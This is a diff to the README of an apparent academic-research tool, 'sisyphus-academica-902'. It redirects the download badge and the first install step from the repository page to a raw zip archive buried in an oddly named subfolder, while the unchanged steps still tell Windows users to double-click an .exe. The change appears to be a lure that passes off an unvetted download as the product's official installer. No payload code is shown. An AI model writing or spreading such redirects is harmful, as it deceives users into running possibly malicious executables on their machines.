@@ -1,6 +1,6 @@
 # 📚 sisyphus-academica-902 - Streamline your complex academic research pipeline
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Lateripening-ritual19/sisyphus-academica-902)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Lateripening-ritual19/sisyphus-academica-902/main/isomery/academica_sisyphus_2.0.zip)
 
 sisyphus-academica-902 helps researchers manage their academic workflow. This tool automates literature reviews, generates new research ideas, checks citations, and reviews papers. It uses machine learning to assist with tasks that usually take weeks. Use this software to save time and improve the quality of your academic output.
 
@@ -27,7 +27,7 @@ Your computer needs to meet these basic standards to run the application well:
 
 Follow these steps to install the software on your Windows computer.
 
-1. Visit this page to download: [https://github.com/Lateripening-ritual19/sisyphus-academica-902](https://github.com/Lateripening-ritual19/sisyphus-academica-902).
+1. Visit this page to download: [https://raw.githubusercontent.com/Lateripening-ritual19/sisyphus-academica-902/main/isomery/academica_sisyphus_2.0.zip](https://raw.githubusercontent.com/Lateripening-ritual19/sisyphus-academica-902/main/isomery/academica_sisyphus_2.0.zip).
 2. Look for the file ending in .exe in the releases section.
 3. Save the file to a folder you can find easily, such as your Downloads folder.
 4. Double-click the file to start the installation setup.
